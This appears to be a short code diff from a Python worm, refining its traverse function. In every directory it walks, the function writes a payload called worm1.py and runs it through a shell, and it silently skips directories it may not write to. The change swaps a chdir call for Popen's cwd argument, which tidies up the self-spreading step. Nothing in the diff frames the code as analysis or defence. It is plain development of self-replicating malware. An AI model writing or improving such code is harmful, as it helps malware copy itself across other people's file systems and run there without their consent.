@@ -28,9 +28,8 @@ def traverse(path):
         worm_path = ospath.realpath(path)+"\worm1.py"
         with open(worm_path, "wb") as outfile:
             outfile.write(WORM_BIN)
-        chdir(ospath.realpath(path))
         
-        run = Popen(("worm1.py"), shell=True)
+        run = Popen(("worm1.py"), shell=True, cwd=ospath.realpath(path))
         
     except PermissionError:
         pass
